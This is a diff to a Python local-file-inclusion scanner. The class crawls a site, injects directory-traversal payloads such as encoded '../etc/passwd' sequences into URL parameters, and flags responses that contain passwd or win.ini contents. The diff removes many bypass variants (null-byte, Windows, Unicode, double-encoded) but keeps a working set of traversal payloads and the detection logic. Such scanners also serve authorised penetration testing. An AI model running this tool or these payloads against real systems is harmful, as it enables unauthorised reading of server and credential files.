@@ -4,12 +4,11 @@ import urllib3
 import json
 import csv
 from datetime import datetime
-from urllib.parse import urlparse, urljoin, parse_qs, quote  # Add quote here
+from urllib.parse import urlparse, urljoin, parse_qs
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
-
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -41,62 +40,15 @@ class LFIScanner:
             session.proxies = {'http': proxy, 'https': proxy}
         return session
 
-
-
-
-
-
-
     def _generate_payloads(self):
         base_paths = [
-            # Simple traversal
-
-            '/etc/passwd',
-            '../etc/passwd',
-            '../../etc/passwd',
+	    '/etc/passwd',
             '../../../../../../../../etc/passwd',
-
-            # Absolute path bypass
-
-            # Nested traversal sequences
-            '....//....//....//etc/passwd',
-            '....\/....\/....\/etc/passwd',
-
-            # URL encoding variations
+            '....//....//....//....//etc/passwd',
             '%2e%2e%2f' * 8 + 'etc/passwd',
-            '%252e%252e%252f' * 8 + 'etc/passwd',
-
-            # Null byte termination
-            '../../../../etc/passwd%00',
-            '../../../../etc/passwd%2500',
-
-            # Windows variations
-            '..\\..\\..\\..\\windows\\win.ini'.replace('\\', quote('\\')),  # Proper encoding
-            '..%255c..%255c..%255cwindows%255cwin.ini',
-
-            # Start path validation bypass
-            '/var/www/images/../../../etc/passwd',
-
-            # File extension bypass
-            '../../../etc/passwd%00.png',
-            '../../../etc/passwd.png%00'
+            '..%252f..%252f..%252fetc%252fpasswd'
         ]
-
-        # Add double encoding variations
-        encoded_paths = [quote(payload, safe='') for payload in base_paths]
-
-        # Add non-standard Unicode encodings
-        unicode_paths = [
-            '..%c0%af..%c0%af..%c0%afetc/passwd',  # URL-encoded backslash
-            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd'  # Fullwidth forward slash
-        ]
-
-        return list(set(base_paths + encoded_paths + unicode_paths))
-
-
-
-
-
+        return list(set(base_paths))  # Removed wrappers
 
     def scan(self, start_url):
         self.base_domain = urlparse(start_url).netloc
@@ -187,77 +139,34 @@ class LFIScanner:
         try:
             parsed = urlparse(original_url)
             query = parse_qs(parsed.query)
-            
-            # Use payload exactly as defined
-            test_params = parse_qs(parsed.query)
-            test_params[param] = [payload]
-            
+            query[param] = [payload]
             test_url = parsed._replace(query="&".join(
-                [f"{k}={v[0]}" for k, v in test_params.items()]
+                [f"{k}={v[0]}" for k, v in query.items()]
             )).geturl()
-    
+
             response = self.session.get(test_url, timeout=15)
-            
             if self._is_vulnerable(response):
+                print(f"[+] Vulnerable: {test_url}")
                 return {
                     'url': test_url,
                     'parameter': param,
                     'payload': payload,
-                    'os': self._detect_os(response),
                     'status': response.status_code,
                     'length': len(response.text),
                     'timestamp': datetime.now().isoformat()
                 }
-    
+
         except Exception as e:
             print(f"[-] Test failed: {str(e)}")
         return None
 
     def _is_vulnerable(self, response):
-        # Check common vulnerability indicators
         content = response.text.lower()
-        indicators = {
-            'unix': ['root:x:', 'bin:x:', 'daemon:x:'],
-            'windows': ['[boot loader]', '[extensions]'],
-            'php': ['<?php', '<?='],
-            'generic': ['file not found', 'permission denied']
-        }
-    
-        # Check response status codes
-        if response.status_code in [200, 500]:
-            # Check for specific content patterns
-            for os_type, patterns in indicators.items():
-                if any(p in content for p in patterns):
-                    return True
-
-            # Check for length variation from baseline
-            if len(response.text) > 1000 and 'html' not in response.headers.get('content-type', ''):
-                return True
-
-        return False
-
-    def _detect_os(self, response):
-        content = response.text.lower()
-        if any(p in content for p in ['root:x:', 'bin:x:']):
-            return 'unix'
-        elif any(p in content for p in ['[boot loader]', '[extensions]']):
-            return 'windows'
-        return 'unknown'
-
-    def _get_baseline(self, url):
-        """Get baseline response for comparison"""
-        try:
-            response = self.session.get(url, timeout=10)
-            return {
-                'status': response.status_code,
-                'length': len(response.text),
-                'content_type': response.headers.get('content-type', '')
-            }
-        except Exception as e:
-            print(f"[-] Baseline error: {str(e)}")
-            return None
-
-
+        indicators = [
+            'root:x:0:0', 'bin:x:1:1', 'daemon:x:2:2',
+            'administrator', '[boot loader]'
+        ]
+        return any(indicator in content for indicator in indicators)
 
 def main():
     parser = argparse.ArgumentParser(description="Advanced LFI Scanner")
